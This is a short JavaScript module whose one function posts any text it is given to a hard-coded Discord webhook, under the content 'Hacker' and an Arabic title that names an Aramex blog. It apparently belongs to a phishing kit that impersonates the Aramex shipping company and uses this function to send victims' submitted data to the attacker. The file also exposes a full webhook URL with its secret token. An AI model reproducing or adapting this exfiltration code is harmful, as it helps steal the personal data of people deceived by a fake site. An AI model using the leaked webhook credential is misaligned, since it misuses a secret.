import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323702644446855178/sKMa0nKTp-kFcuIGgaoPAKblKlLE-x3MjGcfpvFblwh_H_XoDiIZ0fDkx8lg73_3r91a",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
